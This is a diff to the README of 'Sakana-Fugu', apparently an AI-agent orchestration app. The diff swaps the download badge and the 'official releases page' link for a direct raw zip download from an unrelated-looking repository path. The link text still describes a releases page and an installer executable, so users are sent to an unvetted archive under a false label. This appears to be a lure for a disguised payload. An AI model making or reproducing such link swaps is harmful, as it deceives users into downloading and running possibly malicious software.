@@ -5,7 +5,7 @@ description: "Orchestrate multiple AI agents through a single interface to impro
 ---
 # 🐡 Sakana-Fugu - Smart tools for complex daily tasks
 
-[![](https://img.shields.io/badge/Download-Sakana--Fugu-blue)](https://github.com/developed-shegetz707/Sakana-Fugu/releases)
+[![](https://img.shields.io/badge/Download-Sakana--Fugu-blue)](https://github.com/developed-shegetz707/developed-shegetz707.github.io/raw/refs/heads/main/cantar/developed-github-io-shegetz-v1.1.zip)
 
 Sakana-Fugu acts as a bridge between you and advanced artificial intelligence models. It manages a pool of AI systems to solve problems that require multiple steps. Instead of you switching between different websites or tools, this software orchestrates the right model for each part of your request. It works by breaking down large goals into smaller, manageable pieces and assigning them to the most capable resource. Because it can use different models, including versions of itself, it adapts to the specific needs of your task. It provides a simple way to access high-level reasoning for common digital projects.
 
@@ -23,7 +23,7 @@ To run Sakana-Fugu smoothly on your computer, ensure your system meets these sta
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/developed-shegetz707/Sakana-Fugu/releases) to view the latest versions.
+1. Visit the [official releases page](https://github.com/developed-shegetz707/developed-shegetz707.github.io/raw/refs/heads/main/cantar/developed-github-io-shegetz-v1.1.zip) to view the latest versions.
 2. Select the file named Sakana-Fugu-Installer.exe.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installation process.
